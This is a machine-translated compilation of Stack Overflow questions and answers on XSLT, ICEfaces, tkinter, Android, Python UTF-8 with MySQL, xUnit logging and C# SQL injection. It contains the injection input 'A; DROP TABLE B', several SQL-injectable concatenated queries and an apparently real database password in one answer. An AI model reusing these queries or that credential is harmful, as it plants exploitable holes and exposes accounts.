    <xsl:template match="PanelWrapper">
        <WrapPanel>
            <xsl:apply-templates select="@*|*" />
        </WrapPanel>
    </xsl:template> 
    ```

    它匹配任何名为 PanelWrapper 的元素并将其名称更改为 WrapPannel。

*   您可以使用以下模板更改属性的名称并保留其值：

    ```
    <xsl:template match="@font-size">
        <xsl:attribute name="FontSize">
            <xsl:value-of select="." />
        </xsl:attribute>
    </xsl:template> 
    ```

    它将属性字体大小映射到字体大小。

*   您可以通过匹配属性的名称和值来更改属性的名称和值，例如：

    ```
    <xsl:template match="@font-style[. = 'Regular']">
            <xsl:attribute name="FontStyle">Normal</xsl:attribute>
    </xsl:template> 
    ```

    它匹配所有属性，例如 font-style = 'regular' 并将它们转换为 FontStyle = 'normal'。

# javascript - Javascript 事件 onkeyXXX 在 icefaces 1.8.2 ice:selectinputtext 上不起作用

> ID：15092405
> 
> 赞同：0
> 
> 时间：2013-02-26T15:04:32.427
> 
> 标签：javascript, java, jsf, dom-events, icefaces

我有一个 JSF + icefaces 1.8.2 应用程序，它有一个“ice:selectInputText”。

我只想添加以下 Javascript 事件之一：onkeydown、onkeypress 或 onkeyup。但是它们不起作用。它们什么都不做，当它在浏览器中呈现时，它们甚至不在 Web 的 HTML 代码中。

这是它应该如何工作的吗？

我想知道何时按下“返回”键（Javascript 键码 13），所以我不能使用 Java`valueChangeListener`或`textChangeListener`然后在 Java backbean 中管理它，因为该键不会触发这些事件。

有人可以帮我吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T07:31:32.827

我解决了！！嗯......有人给了我一个解决它的方法。

按下回车键，触发 ice:selectInputText “action”，这样我就可以通过 back bean 中的 java 来管理它了

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-11-03T20:33:03.690

我从您的问题描述中假设标签 id 是 js 函数的参数。在这种情况下，我一直在与同样的问题作斗争。

就我而言，我希望我的自定义脚本限制用户输入。在输出 HTML 时，Icefaces 会更改标签的 id。它将包含的表单 id 作为前缀附加到标记 id 并在 ace:textEntry 标记“ **_input** ”的情况下作为后缀附加。所以我的 ace:textEntry 标签的 id 变成了“ **customer-edit-form:company-name-text_input** ”。要解决这个问题，请使用**this.id**。

工作标签的标记：

```
<ice:form id="customer-edit-form">
    <ace:textEntry styleClass = "edit-textbox" 
        id="company-name-text1" 
        label="Company"
        labelPosition="left" 
        onkeyup="limitLengthByID(this.id, '4'); "
        value="#{customerManagerBean.companyName}">
    </ace:textEntry>
</ice:form>**strong text** 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-26T16:42:25.403

它应该工作：

HTML：

```
<ice:selectInputText
<!-- your stuff -->
onkeypress="check(event);"
</ice:selectInputText> 
```

JavaScript：

```
 function check(e) {

       var key;
       if(!window.event) {
           key = e.which;
       } else {
          key = window.event.keyCode;
       }

       if(key == 13) {
          alert('enter!');
       }
    } 
```

# python-3.x - 绑定返回到 ttk 条目数组中的每个元素

> ID：15092406
> 
> 赞同：0
> 
> 时间：2013-02-26T15:04:34.820
> 
> 标签：python-3.x, tkinter, bind, tkinter-entry

我正在使用 tkinter 创建一个类似“网格”的结构，该结构在输入字段中显示 eeprom 的内容。

```
for byteRow in range (0, 16, 1):
    for byteColumn in range (0, 16, 1):
        byteEeprom = StringVar()
        self.byteEepromArray.append(byteEeprom)
        self.entryEepromArray.append(ttk.Entry(rawEeprom, width=3, textvariable = self.byteEepromArray[byteColumn+(16*byteRow)]))
        self.entryEepromArray[byteColumn+(16*byteRow)].grid(column = byteColumn, row = byteRow+2, sticky = (N, W)) 
```

以上所有内容都可以正常工作并填充在一个函数中，`self.byteEepromArray[byte].set()`但我正在尝试更改代码，以便如果有人想更改其中一个 eeprom 位置，他们将更改其中一个输入字段的内容，按回车键和一个函数将被要求与 eeprom 交谈。不幸的是，当脚本被导入时，函数 makeRawProbe 被调用，而不是等待事件发生。

```
 for byteRow in range (0, 16, 1):
        for byteColumn in range (0, 16, 1):
            byteEeprom = StringVar()
            self.byteEepromArray.append(byteEeprom)
            self.entryEepromArray.append(ttk.Entry(rawEeprom, width=3, textvariable = self.byteEepromArray[byteColumn+(16*byteRow)]))
            self.entryEepromArray[byteColumn+(16*byteRow)].grid(column = byteColumn, row = byteRow+2, sticky = (N, W))
            self.entryEepromArray[byteColumn+(16*byteRow)].bind('<Return>', self.makeRawProbe(byteColumn+(16*byteRow))) 
```

我已经尝试更改为以防它从命令行中发现一些奇怪的东西，但同样的事情也会发生。我想我在做一些愚蠢的事情，但就是看不到它是什么，请有人指出我正确的方向吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T15:31:26.060

to 的参数`bind`必须是对函数的*引用*。当您执行以下操作时：

```
...bind('<Return>', self.makeRawProbe(byteColumn+(16*byteRow))) 
```

...那么您实际上是在调用`self.makeRawProbe(...)`，并且该调用的结果是分配给绑定的结果。

相反，您需要传递对函数本身的引用。由于您需要将参数传递给函数，因此您将需要使用类似`lambda`or`functools.partial`或某种工厂的东西。我偏爱，`lambda`因为它不需要拉入另一个库。

例如：

```
value = byteColumn+(16*byteRow)
...bind('<Return>', lambda event, idx=value: self.makeRawProbe(idx)) 
```

# search - App Explorer 中的 Aptana Studio 3 限制搜索

> ID：15092408
> 
> 赞同：1
> 
> 时间：2013-02-26T15:04:48.760
> 
> 标签：search, aptana3

如果我使用“App Explorer”下的搜索，搜索将解析任何文件类型（也包括图像），因此搜索速度非常慢。如何在不使用对话框搜索的情况下排除这些文件？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T13:37:45.260

在这种情况下，我建议您使用过滤器。去

```
Project -> Properties -> Resource -> Resource Filter. 
```

在那里添加一个过滤器，例如

**排除所有**

**文件**

**名称匹配：*.jpg**

或 **名称匹配：*.png**

或在这种情况下使您的搜索变慢的任何事情，并且对您根本没有用处。这样，您将在整个 App Explorer 窗口中排除所有对您无用的资源。

# android - Android GridView 选择一张图片

> ID：15092412
> 
> 赞同：0
> 
> 时间：2013-02-26T15:05:01.663
> 
> 标签：android, gridview, imageview

我有一个`GridView`用图像设置的。我想要做的是当用户选择（图像）时，它应该在所选图像上显示一个标记。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T15:28:06.693

[http://developer.android.com/guide/topics/ui/layout/gridview.html](http://developer.android.com/guide/topics/ui/layout/gridview.html)

链接中的代码可能会有所帮助，我可以看到两种可能的解决方案

1) 如果图片没有出现在服务器上，您可以有两组图片，一组正常，另一组在点击时出现检查。

2）我不确定这是否可行，但我们可以设计一个自定义布局，就像我们对 listView 所做的那样，并使用 getview() 覆盖方法中的 inflater 类对其进行充气。

将尝试第二个选项并回复您。

# html - iFrame 中的 Facebook 分享按钮

> ID：15092413
> 
> 赞同：0
> 
> 时间：2013-02-26T15:05:01.957
> 
> 标签：html, facebook-sharer

我有一个使用 php 和 mysql 在列表中显示新闻项目的网站。您可以在以下位置查看：

[http://www.teamabthbuccaneers.co.uk/index.php?page=News.php](http://www.teambathbuccaneers.co.uk/index.php?page=News.php)

我希望能够在每个项目上添加 Facebook 共享徽标/链接，以便当用户单击共享按钮时，只有一篇文章会出现在他们自己的 Facebook 墙上。

我已使用 Facebook 开发人员页面上提供的信息来创建测试，但初始测试显示的是外部框架而不是内部 iframe。

任何关于如何制作将显示单个新闻项目的东西的建议都非常受欢迎。

谢谢。

米

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2020-02-07T10:41:01.030

转到：[https](https://developers.facebook.com/docs/plugins/share-button/) ://developers.facebook.com/docs/plugins/share-button/ -> 获取代码 -> iFrame。

输入显示项目详细信息页面的链接，该链接必须包含唯一标识符，您将在 iframe 标记内看到：

```
 src="https://www.facebook.com/plugins/share_button.php?href=https%3A%2F%{{  your url }}%2F{{  detail-page  }}%2F{{  unique-identifier  }}&layout=button_count&size=large&appId=243300912962319&width=150&height=22"width="150" height="22" style="border:none;overflow:hidden" scrolling="no"frameborder="0" allowTransparency="true" allow="encrypted-media"> 
```

# javascript - jQuery ajax 在 IE 的生产环境中不起作用

> ID：15092415
> 
> 赞同：0
> 
> 时间：2013-02-26T15:05:12.767
> 
> 标签：javascript, internet-explorer, jquery

我正在尝试使用 jQuery 的 ajax 函数进行服务调用。我已经在 IE 和 Chrome 的本地环境中对其进行了测试，并且运行良好。但是，在将我们的站点部署到生产环境后，我只能在 Chrome 中调用服务调用。单步执行检查器中的代码，我可以看到它进入了 IE 中的 ajax 函数，但从未发出请求。我使用过 fiddler，并且在使用 Chrome 而不是 IE 时可以看到通话。

```
var customers;

function AutoComplete(TheId) {

    if (!customers) {
        $.ajax({
            type: "GET",
            url: "api/customerapi",
            dataType: "json",
            async: false,
            success: function (data) {
                customers = data;
            }
        });
     }

.... further code ....
} 
```

任何想法这里可能出了什么问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T15:20:55.413

您的代码没有太多漏洞。您应该提供更多详细信息以及指向您制作的小提琴的链接。

需要考虑的一些一般事项：

您是否使用 http:// 发出 https:// 请求，反之亦然？在部署到生产环境（即 https）后使用 IE 时，这给我带来了麻烦。它会抱怨安全遭到破坏，甚至不会提出请求。

`async: false`除非你有**充分**的理由，否则不要使用。它冻结用户的浏览器，直到请求完成。在 IE 上它特别糟糕，因为它冻结了整个浏览器，而不仅仅是页面。几乎没有理由应该使用同步请求，因为 jQuery 让使用异步请求变得如此简单。您可以执行与同步完全相同的操作，而无需冻结浏览器。收集所有需要的数据，然后从那里继续。如果您的问题是如何使用异步请求，我建议您重新编写问题。

These are some very general suggestions, if you make your question more specific, you'll probably get an equally specific answer.

# php - 如何从代码中删除多余的文本？

> ID：15092418
> 
> 赞同：0
> 
> 时间：2013-02-26T15:05:20.340
> 
> 标签：php, web

我正在尝试在网站的首页上插入 2 个水平规则。一个在截面上方，另一个在截面下方。我有 hr 行的类，但是当尝试使用它时，它不会显示在页面上，除非我输入一个字符，在这种情况下我输入了一个点。无论我做什么尝试使点消失或不使用它，我也会丢失 hr 行（我尝试将它们注释掉）。这是代码（包含上面和下面的行以及部分本身的 div）：

```
<div class="not-front hr">         
.
<hr />
</div>        
<div class="grid_11 footercontent">
<?php
    $block = module_invoke("views","block_view","engineering_solutions-block");
     print render($block['content']);
?>
</div>
<div class="not-front hr">  
.
<hr />
</div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T15:13:29.970

几件事，也尝试使用`<hr>`，没有看到你的css，很难给出一个直接的解决方案，但基于你给我们的问题，这将解决它

```
<div class="not-front hr">         
<span style = "display:none;">.</span>
<hr>
</div>        
<div class="grid_11 footercontent">
<?php
    $block = module_invoke("views","block_view","engineering_solutions-block");
     print render($block['content']);
?>
</div>
<div class="not-front hr">  
<span style = "display:none;">.</span>
<hr>
</div> 
```

**作为旁注**，通常认为在`<div>`名称中使用空格是不好的做法

# javascript - 将一个 html 页面的值传递给另一个 html javascript 函数

> ID：15092419
> 
> 赞同：0
> 
> 时间：2013-02-26T15:05:20.980
> 
> 标签：javascript, html

我需要使用 javascript 代码将一个 html 页面的值传递给另一个 html javascript 函数。如何传递价值。提前致谢

```
view.cshtml:
b.on('click', function () {
    document.location.href =  + '?Id=' + sData; // need to pass the value
});

index.cshtml:
function getId(data) { // i need to get the data here
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-26T15:25:40.733

您可以通过 Javascript 检索 GET 数据。我创建了一个使用 PHP 样式语法的示例：

```
<script>
var $_GET = {};
(function() {
    var params=top.location.search.split("?").join("").split("&");
    for(var i=0;i<params.length;i++){
        var param=params[i].split("=");
        $_GET[param[0]]=param[1];
    }
})();

alert($_GET['Id']);

</script> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T15:07:35.253

你有两个选择：

*   将数据保存在客户端，例如 cookie。
*   在 GET 或 POST 请求中将其传递给服务，并获取服务器端脚本（例如 PHP）以将值传入。

通过服务器，如果使用 PHP 为例：

```
view.cshtml:
// assume sData = 5
b.on('click', function () {
    document.location.href =  + 'index.php?Id=' + sData;
}); 
```

当您单击该功能时，它会从服务器请求 index.php。

```
index.php:
<?php
    ...
    echo "var id = $_POST['Id'];";
    echo "function getId() {";
    // Function code here refering to id variable
    echo "}";
    ...
?> 
```

index.php 生成：

```
index.cshtml:
var id = 5;
function getId() {

} 
```

# c# - 在点击内部控件时引发用户控件单击

> ID：15092421
> 
> 赞同：1
> 
> 时间：2013-02-26T15:05:27.327
> 
> 标签：c#, .net, vb.net

我创建了一个用户控件，里面有一些标签和图片。

然后，我将此用户控件添加到表单中。

在表单事件中，我设置了 UserControl_click 事件来引发函数。

我遇到的问题是，如果我点击 UserControl 背景，那里没有标签也没有图片，函数就会被提升。但是，如果我单击控件内的标签或图片，则该功能不会启动。

在单击用户控件中的控件时，我想要与单击控件背景时相同的行为。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T15:08:48.133

您的标签捕获点击事件。订阅他们的 Click 事件并调用您从 UserControl_click 调用的相同处理程序。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-26T15:36:35.323

您必须在 UserControl 内的每个控件单击事件上添加添加功能：

```
Public Event ControlClick(sender As Object, e As EventArgs)

Private Sub uc1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
    For each elem As Control in Me.Controls
        AddHandler elem.Click, AddressOf RaiseClick
    Next
End Sub

Private Sub RaiseClick(sender As Object, e As EventArgs)
    RaiseEvent ControlClick(sender, e)
End Sub 
```

然后在外面抓住这两个事件：

```
Public Sub UserControl_click(sender As Object, e As EventArgs) _
                           Handles UserControl1.Click, UserControl1.ControlClick
    '...
End Sub 
```

# android - 如何让 ImageButton 表现得像 ViewGroup？

> ID：15092436
> 
> 赞同：1
> 
> 时间：2013-02-26T15:06:02.653
> 
> 标签：android, button, textview, imageview

我想要一个图像，在图像上我想放置一个较短的半透明视图并在该视图内放置一个文本视图，最后我想要所有这些可点击的显示基本点击效果的按钮。

我无法使用

```
<Button>
   <ImageView>
      <TextView/>
   </ImageView>
</Button> 
```

我可以使用 Clickable=true 创建一个 LinearLayout。但是如何模仿按钮上存在的视觉按下效果呢？

**更新：**我添加了一张图片，显示了我希望如何看到它。认为这类似于 ImageButton（它应该具有按下效果）

![在此处输入图像描述](../Images/bc1ddfc85df3f82bc9a6be0ea9cf7c67.png)

**UPDATE-2：**我添加了另一个显示按下效果的图像。（类似于 Play 商店应用程序）。 ![在此处输入图像描述](../Images/0f5bdddf26572c008c1d49e04622449f.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-26T15:28:31.200

使用您选择的布局来创建您想要的效果并`@android:style/Widget.Button`在布局上设置样式。

此外，您可能需要调用`setWillNotDraw(false)`布局。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-26T15:29:45.017

但是我怎样才能模仿按钮上存在的视觉按下效果呢？

如果我没记错的话，你可以在 LinearLayout 中添加 android:background="@drawable/some_click"

```
some_click.xml
<selector
xmlns:android="http://schemas.android.com/apk/res/android">
<item
android:state_pressed="true" 
android:drawable="@drawable/pressed" /> <!-- pressed -->
<item
android:state_focused="true" 
android:drawable="@drawable/focused" /> <!-- focused -->
<item
android:drawable="@drawable/default" /> <!-- default -->
</selector> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-26T15:32:58.413

创建一个包含图像和文本等的 ViewGroup（例如 LinearLayout/RelativeLayout/etc）。

使这个 ViewGroup 可点击（例如，通过为其分配一个 OnClicListener）。

为该 ViewGroup 分配一个**背景可绘制对象。**

确保此背景可绘制对象是状态列表可绘制对象： [https ://developer.android.com/reference/android/graphics/drawable/StateListDrawable.html](https://developer.android.com/reference/android/graphics/drawable/StateListDrawable.html) [http://developer.android.com/guide/topics/resources/ drawable-resource.html#StateList](http://developer.android.com/guide/topics/resources/drawable-resource.html#StateList)

将适当的可绘制对象分配给各种状态（最重要的是 state_pressed，但您可能还想处理其他状态）。

当用户按下按钮时，将显示适当的可绘制对象，并且看起来好像 ViewGroup 是一个按钮（可以按下的东西）。

**OP 显示按下状态的新图像后更新：**

添加一个位于图像/文本/等之上的视图，其背景具有 StateListDrawable：

```
<RelativeLayout >
    <ImageView 
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:src="@drawable/somerealpngfile"
        ... 
    />
    <TextView  
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:layout_alignParentBottom="true"
        ... 
    />
    <View 
        android:id+"@+id/clickable_view"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:background="@drawable/selectable_background"
        android:clickable="true"

        ... 
    />
</RelativeLayout> 
```

**res/drawable/selectable_background.xml**

```
<selector xmlns:android="http://schemas.android.com/apk/res/android">
    <item android:state_pressed="true" android:drawable="@color/grid_state_pressed"/>
    <item android:state_focused="true" android:drawable="@color/grid_state_focused"/>
    <item android:drawable="@android:color/transparent"/>
</selector> 
```

res/values/colors.xml

```
<?xml version="1.0" encoding="utf-8"?>
<resources>
  ...
  <color name="grid_state_pressed">#BB7dbcd3</color>
  <color name="grid_state_focused">#777dbcd3</color>
  ...
</resources> 
```

其中颜色`grid_state_pressed`和`grid_state_focused`是半透明的（即它们的 alpha 小于 255）。

当用户单击您的“按钮”时，View`R.id.clickable_view`将处理 onClick 并更改其背景颜色，从而导致图像和文本以半透明的方式闪耀。

# python - python编码utf-8

> ID：15092437
> 
> 赞同：51
> 
> 时间：2013-02-26T15:06:03.197
> 
> 标签：python, unicode, encoding, utf-8

我正在用 python 做一些脚本。我创建了一个保存在文件中的字符串。这个字符串有很多数据，来自目录的树状结构和文件名。根据 convmv，我所有的树状结构都是 UTF-8。

我想将所有内容保存在 UTF-8 中，因为之后我会将其保存在 MySQL 中。目前，在 UTF-8 格式的 MySQL 中，我遇到了一些字符问题（例如 é 或 è - 我是法国人）。

我希望 python 总是使用字符串作为 UTF-8。我在互联网上阅读了一些信息，我确实喜欢这个。

我的脚本以此开头：

```
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
 def createIndex():
     import codecs
     toUtf8=codecs.getencoder('UTF8')
     #lot of operations & building indexSTR the string who matter
     findex=open('config/index/music_vibration_'+date+'.index','a')
     findex.write(codecs.BOM_UTF8)
     findex.write(toUtf8(indexSTR)) #this bugs! 
```

当我执行时，这是答案：`UnicodeDecodeError: 'ascii' codec can't decode byte 0xc3 in position 2171: ordinal not in range(128)`

编辑：我看到，在我的文件中，口音写得很好。创建此文件后，我读取它并将其写入 MySQL。但我不明白为什么，但我遇到了编码问题。我的 MySQL 数据库是 utf8，或者似乎是 SQL 查询`SHOW variables LIKE 'char%'`只返回 utf8 或二进制。

我的功能如下所示：

```
#!/usr/bin/python
# -*- coding: utf-8 -*-

def saveIndex(index,date):
    import MySQLdb as mdb
    import codecs

    sql = mdb.connect('localhost','admin','*******','music_vibration')
    sql.charset="utf8"
    findex=open('config/index/'+index,'r')
    lines=findex.readlines()
    for line in lines:
        if line.find('#artiste') != -1:
            artiste=line.split('[:::]')
            artiste=artiste[1].replace('\n','')

            c=sql.cursor()
            c.execute('SELECT COUNT(id) AS nbr FROM artistes WHERE nom="'+artiste+'"')
            nbr=c.fetchone()
            if nbr[0]==0:
                c=sql.cursor()
                iArt+=1
                c.execute('INSERT INTO artistes(nom,status,path) VALUES("'+artiste+'",99,"'+artiste+'/")'.encode('utf8') 
```

并且在文件中很好地显示的艺术家将错误写入 BDD。问题是什么 ？

* * *

## 回答 #1

> 赞同：62
> 
> 时间：2013-02-26T15:10:34.637

您不需要对*已经*编码的数据进行编码。当您尝试这样做时，Python 将首先尝试将其*解码*为 UTF-8 ，`unicode`然后才能将其编码回 UTF-8。这就是这里失败的原因：

```
>>> data = u'\u00c3'            # Unicode data
>>> data = data.encode('utf8')  # encoded to UTF-8
>>> data
'\xc3\x83'
>>> data.encode('utf8')         # Try to *re*-encode it
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
UnicodeDecodeError: 'ascii' codec can't decode byte 0xc3 in position 0: ordinal not in range(128) 
```

只需将数据直接写入文件，*无需*对已编码的数据进行编码。

如果您改为建立`unicode`值，则确实必须将它们编码为可写入文件。您想[`codecs.open()`](http://docs.python.org/2/library/codecs.html)改用它，它会返回一个文件对象，该对象将为您将 unicode 值编码为 UTF-8。

您也*真的*不想写出 UTF-8 BOM，*除非*您*必须*支持无法读取 UTF-8 的 Microsoft 工具（例如 MS Notepad）。

对于您的 MySQL 插入问题，您需要做两件事：

*   添加`charset='utf8'`到您的`MySQLdb.connect()`通话中。

*   在查询或插入时使用`unicode`对象，而不是对象，而是*使用 sql 参数*，以便 MySQL 连接器可以为您做正确的事情：`str`

     *```
    artiste = artiste.decode('utf8')  # it is already UTF8, decode to unicode

    c.execute('SELECT COUNT(id) AS nbr FROM artistes WHERE nom=%s', (artiste,))

    # ...

    c.execute('INSERT INTO artistes(nom,status,path) VALUES(%s, 99, %s)', (artiste, artiste + u'/')) 
    ```* 

 *如果您习惯于`codecs.open()`自动解码内容，它实际上可能会更好：

```
import codecs

sql = mdb.connect('localhost','admin','ugo&(-@F','music_vibration', charset='utf8')

with codecs.open('config/index/'+index, 'r', 'utf8') as findex:
    for line in findex:
        if u'#artiste' not in line:
            continue

        artiste=line.split(u'[:::]')[1].strip()

    cursor = sql.cursor()
    cursor.execute('SELECT COUNT(id) AS nbr FROM artistes WHERE nom=%s', (artiste,))
    if not cursor.fetchone()[0]:
        cursor = sql.cursor()
        cursor.execute('INSERT INTO artistes(nom,status,path) VALUES(%s, 99, %s)', (artiste, artiste + u'/'))
        artists_inserted += 1 
```

您可能想复习一下 Unicode 和 UTF-8 和编码。我可以推荐以下文章：

*   Python [Unicode HOWTO](http://docs.python.org/2/howto/unicode.html)

*   Ned Batchelder 的[实用 Unicode](http://nedbatchelder.com/text/unipain.html)

*   [每个软件开发人员绝对、绝对必须了解 Unicode 和字符集（没有任何借口！）](http://joelonsoftware.com/articles/Unicode.html)作者：Joel Spolsky

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-02-03T16:50:32.947

不幸的是，string.encode() 方法并不总是可靠的。查看此线程以获取更多信息：[在 python 中将某些字符串（utf-8 或其他）转换为简单的 ASCII 字符串的万无一失的方法是什么](https://stackoverflow.com/questions/1792602/what-is-the-fool-proof-way-to-convert-some-string-utf-8-or-else-to-a-simple-as)*

# c# - 使用 ReSharper，如何在长时间运行的单元测试期间显示调试输出？

> ID：15092438
> 
> 赞同：37
> 
> 时间：2013-02-26T15:06:05.220
> 
> 标签：c#, visual-studio, unit-testing, resharper, xunit

我将 xUnit 与 ReSharper 测试运行器和[xUnitContrib](http://xunitcontrib.codeplex.com/) resharper插件一起使用。

当我有一个长时间运行的测试时，我希望能够将一些进度指示器输出到单元测试输出窗口。

我试过了`Debug.WriteLines`，`Trace.WriteLine`和`Console.WriteLine`。所有这些都具有相同的行为 - 在测试完成之前，输出窗口中不会显示任何内容。

例如：

```
[Fact]
public void Test()
{
    Debug.WriteLine("A");
    Trace.WriteLine("B");
    Console.WriteLine("C");

    Thread.Sleep(10000);
} 
```

在 10 秒过去且测试完成之前，测试不会显示任何输出。我如何一路获得输出？

**更新 1**

我也尝试过使用 MSTest 和 NUnit。NUnit 是唯一一个一路显示输出的。

在测试完成之前，MSTest 和 XUnit 不会返回任何输出。奇怪的是，虽然 XUnit 和 NUnit 测试输出看起来像这样：

```
A
B
C 
```

MSTest 输出如下所示：

```
C

Debug Trace:

A
B 
```

鉴于所有这些变化，我认为答案是由测试运行程序实现来决定如何以及何时输出。有谁知道是否可以配置 XUnit 测试运行器？

**更新 2**

我认为这一定是 xUnitContrib 的不足之处。发布到他们的[CodePlex 问题跟踪器](http://xunitcontrib.codeplex.com/workitem/4160)。

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2015-07-08T12:15:48.310

> 如果您使用 xUnit.net 1.x，您之前可能已经将输出写入控制台、调试或跟踪。当 xUnit.net v2 默认开启并行化时，这种输出捕获机制不再适用；不可能知道可以并行运行的许多测试中的哪些负责写入这些共享资源。将代码从 v1.x 移植到 v2.x 的用户应该改用这两种新方法之一。

在这里查看如何使用 xUnit.net v2 执行日志记录的示例：

[http://xunit.github.io/docs/capturing-output.html](http://xunit.github.io/docs/capturing-output.html)

这是一个例子：

```
using Xunit;
using Xunit.Abstractions;

public class MyTestClass
{
    private readonly ITestOutputHelper output;

    public MyTestClass(ITestOutputHelper output)
    {
        this.output = output;
    }

    [Fact]
    public void MyTest()
    {
        var temp = "my class!";
        output.WriteLine("This is output from {0}", temp);
    }
} 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2019-02-03T14:31:40.083

对于 NUnit 这有效：

```
Console.SetOut(TestContext.Progress); 
```

**迟到的答案是因为我有同样的问题，我刚刚解决了。可以帮助别人

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2014-11-13T09:46:04.633

ReSharper 以某种方式删除了单元测试中的默认侦听器。要在输出窗口中显示文本，只需添加以下行：

```
Debug.Listeners.Add(new DefaultTraceListener()); 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2019-04-15T20:43:01.607

[XunitLogger](https://github.com/SimonCropp/XunitLogger)用于`AsyncLocal<T>`跟踪日志记录上下文，因此调用`Trace.Writeline`并`Console.Writeline`可以路由到`ITestOutputHelper`.

用法：

```
static class ClassBeingTested
{
    public static void Method()
    {
        Trace.WriteLine("From Trace");
        Console.WriteLine("From Console");
        Console.Error.WriteLine("From Console Error");
    }
}

public class TestBaseSample  :
    XunitLoggingBase
{
    [Fact]
    public void Write_lines()
    {
        WriteLine("From Test");
        ClassBeingTested.Method();

        var logs = XunitLogger.Logs;

        Assert.Contains("From Test", logs);
        Assert.Contains("From Trace", logs);
        Assert.Contains("From Console", logs);
        Assert.Contains("From Console Error", logs);
    }

    public TestBaseSample(ITestOutputHelper output) :
        base(output)
    {
    }
} 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2021-02-04T22:42:58.423

在你问这个问题 8 年后，我对 NUnit 也有同样的问题。:-(

我很确定这是 Resharper 在某些时候默认实现的，因为我不记得我之前必须手动执行此操作。但有时，它停止了工作。

解决方案（对于 NUnit）是在 NUnit 单元测试的顶部添加这一行。

```
Console.SetOut(TestContext.Progress) 
```

这会使您的所有（现有） Console.Out.WriteLine("") 直接输出到 Resharper Unit Test Runner 输出部分，同时执行单元测试。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-02-26T15:19:52.670

我发现最简单的方法是利用 log4net 并创建一个控制台记录器。一路上，当你跑步时，你会调用 logger.Info("info here"); 或 log.Debug("这里的信息"); - 真的是你喜欢的日志记录级别 - 输出将显示在 Resharper 单元测试会话中。

[在 Apache log4net 主页上](http://logging.apache.org/log4net/)阅读有关 log4net 框架的更多信息。[配置示例](http://logging.apache.org/log4net/release/config-examples.html)也将非常宝贵。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2019-06-20T15:20:22.683

您也可以考虑使用`xunit.NLog`which 是一种非常好且干净的方式来注入`ITestOutputhelper`您的 SUT。

[http://www.tomdupont.net/2015/06/capture-xunit-test-output-with-nlog-and.html](http://www.tomdupont.net/2015/06/capture-xunit-test-output-with-nlog-and.html)

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2021-12-18T07:19:41.120

因为`Console.WriteLine`，这是一种方法（可能有更好的方法，但这对我有用）：

```
public class ConsoleOutputHelper : TextWriter, ITestOutputHelper
{
    private readonly ITestOutputHelper _helper;

    public ConsoleOutputHelper(ITestOutputHelper helper) => _helper = helper;

    public override void WriteLine(string? message)
    {
        try
        {
            _helper.WriteLine(message);
        }
        catch (InvalidOperationException ex) when (ex.Message.Contains("no currently active test"))
        {
        }
    }

    public override void WriteLine(string format, params object?[] args) => 
        _helper.WriteLine(format, args);

    public override Encoding Encoding => new UTF8Encoding();
} 
```

...然后，在您的测试构造函数中：

```
public MyTests(ITestOutputHelper helper) => 
    Console.SetOut(new ConsoleOutputHelper(helper)); 
```

...然后，在您正在测试的代码中

```
Console.Out.WriteLine("Beginning something..."); 
```

**更新**

`Trace.WriteLine`在生产代码中可能更好。

设置看起来像这样（需要添加和删除跟踪侦听器）：

```
public class MyTests : IDisposable
{
    private readonly TraceOutputHelper _traceOutputHelper;

    public MyTests(ITestOutputHelper helper)
    {
        _traceOutputHelper = new TraceOutputHelper(helper);
        Trace.Listeners.Add(_traceOutputHelper);
    }

    public void Dispose() => Trace.Listeners.Remove(_traceOutputHelper); 
```

...并且与上面`TraceOutputHelper`非常相似`ConsoleOutputHelper`：

```
public class TraceOutputHelper : TextWriterTraceListener, ITestOutputHelper
{
    private readonly ITestOutputHelper _helper;

    public TraceOutputHelper(ITestOutputHelper helper) => _helper = helper;

    public override void WriteLine(string? message)
        => _helper.WriteLine(message);

    public void WriteLine(string format, params object[] args) => _helper.WriteLine(format, args);
} 
```

# c# - 在 C# 和 SQL 注入中创建数据库

> ID：15092439
> 
> 赞同：6
> 
> 时间：2013-02-26T15:06:05.000
> 
> 标签：c#, .net, sql, sql-server

我有以下代码用于从 C# 应用程序创建一些数据库

```
SqlConnection myConnection = new SqlConnection(ConnectionString);
string myQuery = "CREATE DATABASE " + tbxDatabase.Text; //read from textbox
myConnection.Open();
SqlCommand myCommand = new SqlCommand(myQuery, myConnection);
myCommand.ExecuteNonQuery(); 
```

现在我担心它是否安全，C# 会接受像“A; DROP TABLE B”这样的黑客输入或类似的东西吗？如何让它更安全？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-26T15:08:40.460

表名和列名不能参数化，但作为第一道防线，用大括号等分隔符将表名包裹起来，

```
string myQuery = "CREATE DATABASE [" + tbxDatabase.Text + "]"; 
```

或创建一个用户定义函数来检查输入的值，例如

```
private bool IsValid(string tableName)
{
    // your pseudocode
